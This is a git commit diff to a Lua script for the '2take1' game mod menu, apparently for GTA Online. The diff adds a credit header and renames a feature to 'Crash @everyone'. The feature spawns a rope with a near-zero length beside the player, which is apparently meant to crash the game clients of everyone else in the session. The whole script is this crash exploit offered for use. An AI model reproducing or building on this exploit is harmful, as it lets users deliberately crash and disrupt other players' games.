eb1e163e36ad1b692b258d18422e2008debad9f8
IMXNOOBX <69653071+IMXNOOBX@users.noreply.github.com>
2023-06-21 11:16:20 +0200

    Added some 2take1 scripts and updated some others

--- 2take1/crash_everijuan.lua
+++ 2take1/crash_everijuan.lua
@@ -1,4 +1,10 @@
-menu.add_feature("Crash Everijuan", "action", 0, function(f)
+--[[
+**  github.com/IMXNOOBX            **
+**  Version: 1.0.1       		   **
+**  github.com/IMXNOOBX/ScriptKid  **
+]]
+
+menu.add_feature("Crash @everyone", "action", 0, function(f)
     local pos = player.get_player_coords(player.player_id())
     pos.x = pos.x + 5
     rope.add_rope(pos, v3(0, 0, 0), 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true)
